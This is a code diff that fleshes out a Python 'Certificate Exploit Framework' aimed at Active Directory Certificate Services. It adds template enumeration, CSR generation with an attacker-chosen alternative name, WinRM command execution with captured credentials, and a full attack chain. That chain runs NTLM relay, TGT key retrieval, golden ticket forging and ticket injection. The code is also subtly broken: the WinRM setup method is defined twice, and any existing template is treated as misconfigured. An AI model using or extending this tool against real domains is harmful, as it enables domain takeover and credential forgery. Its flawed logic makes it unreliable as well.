@@ -9,13 +9,16 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
-
 import logging
+import winrm
 from impacket.smb import SMBConnection
 from impacket.krb5 import kerberos, types
 from impacket.ldap import ldap
 from impacket.ntlm import compute_response
-from cryptography.hazmat.primitives import hashes
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
 from impacket.dcerpc.v5 import transport, lsad
 from impacket.krb5.keytab import Keytab
@@ -66,6 +69,46 @@ class CertificateExploit:
         self.smb_session = None
         self.ldap_connection = None
         self.tgt_key = None
+        self.adcs_connection = None
+
+    def detect_environment(self):
+        logging.debug("Detecting environment requirements...")
+        requirements = {
+            "ldap_connection": False,
+            "smb_connection": False,
+            "misconfigured_templates": False,
+            "adcs_connection": False,
+        }
+
+        # Detect LDAP connection
+        self.ldap_connection = self.connect_ldap()
+        if self.ldap_connection:
+            requirements["ldap_connection"] = True
+
+        # Detect SMB connection
+        self.smb_session = self.connect_smb()
+        if self.smb_session:
+            requirements["smb_connection"] = True
+
+        # Check for misconfigured certificate templates
+        if requirements["ldap_connection"]:
+            try:
+                templates = self.ldap_connection.search(
+                    "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration",
+                    "(objectClass=pkiCertificateTemplate)"
+                )
+                if templates:
+                    requirements["misconfigured_templates"] = True
+            except Exception as e:
+                logging.error(f"Error checking certificate templates: {e}")
+
+        # Detect ADCS connection
+        self.adcs_connection = self.setup_adcs_connection()
+        if self.adcs_connection:
+            requirements["adcs_connection"] = True
+
+        logging.debug(f"Requirements detected: {requirements}")
+        return requirements
 
     def check_template_misconfigurations(self):
         logging.debug(f"Enumerating certificate templates on {self.target}...")
@@ -84,8 +127,43 @@ class CertificateExploit:
 
     def generate_csr(self, custom_data=None):
         logging.debug("Generating CSR (Certificate Signing Request)...")
-        # Placeholder for CSR generation logic
-        pass
+        
+        # Generate a private key
+        private_key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=2048,
+            backend=default_backend()
+        )
+        
+        # Create CSR builder
+        csr_builder = x509.CertificateSigningRequestBuilder()
+        
+        # Add subject name to the CSR
+        subject = [
+            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
+            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
+            x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
+            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
+            x509.NameAttribute(NameOID.COMMON_NAME, u"mycompany.com"),
+        ]
+        
+        csr_builder = csr_builder.subject_name(x509.Name(subject))
+        
+        # Add custom data as extensions if provided
+        if custom_data:
+            csr_builder = csr_builder.add_extension(
+                x509.SubjectAlternativeName([x509.DNSName(custom_data)]),
+                critical=False
+            )
+        
+        # Sign the CSR with the private key
+        csr = csr_builder.sign(private_key, hashes.SHA256(), default_backend())
+        
+        # Serialize the CSR to PEM format
+        csr_pem = csr.public_bytes(serialization.Encoding.PEM)
+        
+        logging.info("CSR generated successfully.")
+        return csr_pem
 
     def auto_enrollment(self):
         logging.debug("Executing AutoEnrollment attack...")
@@ -133,8 +211,18 @@ class CertificateExploit:
     def monitor_adcs(self):
         logging.debug(f"Monitoring certificate requests on {self.target}...")
         try:
-            # Placeholder for monitoring pending ADCS requests
-            pass
+            if not self.adcs_connection:
+                raise Exception("No ADCS connection established.")
+            
+            # PowerShell command to list pending certificate requests
+            ps_command = "Get-CertificationAuthority | Get-CertRequest -Filter 'RequestStatus -eq 9'"
+            
+            result = self.adcs_connection.run_ps(ps_command)
+            if result.status_code == 0:
+                pending_requests = result.std_out.decode()
+                logging.info(f"Pending certificate requests: {pending_requests}")
+            else:
+                logging.error(f"Failed to retrieve pending requests: {result.std_err.decode()}")
         except Exception as e:
             logging.error(f"Error monitoring ADCS: {e}")
 
@@ -146,6 +234,26 @@ class CertificateExploit:
             return tgt_key
         except Exception as e:
             logging.error(f"Error retrieving TGT key: {e}")
+            return None
+
+    def setup_adcs_connection(self):
+        logging.debug("Setting up ADCS connection...")
+        try:
+            # Establish a connection to the ADCS server using WinRM
+            session = winrm.Session(
+                f'http://{self.target}:5985/wsman',
+                auth=(self.username, self.password),
+                transport='ntlm'
+            )
+            # Test the connection by running a simple PowerShell command
+            result = session.run_ps('hostname')
+            if result.status_code == 0:
+                logging.info("ADCS connection established.")
+                return session
+            else:
+                raise Exception("Failed to establish ADCS connection.")
+        except Exception as e:
+            logging.error(f"Error setting up ADCS connection: {e}")
             return None
 
     def execute_exploit(self):
@@ -187,11 +295,41 @@ class CertificateExploit:
 
     def setup_adcs_connection(self):
         logging.debug("Setting up ADCS connection...")
-        pass
+        try:
+            # Establish a connection to the ADCS server using WinRM
+            session = winrm.Session(
+                f'http://{self.target}:5985/wsman',
+                auth=(self.username, self.password),
+                transport='ntlm'
+            )
+            # Test the connection by running a simple PowerShell command
+            result = session.run_ps('hostname')
+            if result.status_code == 0:
+                logging.info("ADCS connection established.")
+                return session
+            else:
+                raise Exception("Failed to establish ADCS connection.")
+        except Exception as e:
+            logging.error(f"Error setting up ADCS connection: {e}")
+            return None
 
     def perform_full_attack(self):
         logging.debug("Performing full attack...")
-        self.execute_exploit()
+        requirements = self.detect_environment()
+        if requirements["ldap_connection"]:
+            self.check_template_misconfigurations()
+        if requirements["misconfigured_templates"]:
+            self.generate_csr(custom_data="Advanced Request Data")
+            self.auto_enrollment()
+        if requirements["smb_connection"]:
+            self.relay_ntlm()
+            self.tgt_key = self.get_tgt_key()
+            if self.tgt_key:
+                golden_ticket = self.create_golden_ticket(self.tgt_key, self.username, self.domain)
+                if golden_ticket:
+                    self.inject_ticket(golden_ticket)
+        if requirements["adcs_connection"]:
+            self.monitor_adcs()
 
 def main():
     logging.debug("Starting Certificate Exploit Framework...")
